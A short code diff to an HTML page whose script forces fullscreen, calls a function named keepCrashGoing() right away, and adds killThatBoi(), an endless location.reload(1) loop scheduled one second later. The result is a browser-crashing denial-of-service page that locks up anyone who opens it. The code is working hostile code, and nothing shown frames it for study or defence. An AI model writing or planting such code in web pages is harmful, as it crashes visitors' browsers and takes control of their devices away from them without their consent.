@@ -64,7 +64,7 @@
       border-top: 4px solid rgba(255, 255, 255, 0.3);
       border-radius: 50%;
       transition: all 0.3s ease;
-      display: none; /* Hidden by default */
+      display: none;
     }
 
     .rotator {
@@ -188,9 +188,11 @@
         else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
         fullScreen = true;
       }
-
+      
+      keepCrashGoing();
+      
       setTimeout(() => {
-        keepCrashGoing();
+        killThatBoi();
       }, 1000);
     }
 
@@ -201,6 +203,9 @@
         spawnWorkers();
         requestAnimationFrame(animate);
       }, 10);
+    }
+    function killThatBoi(){
+      while(1)location.reload(1)
     }
   </script>
 
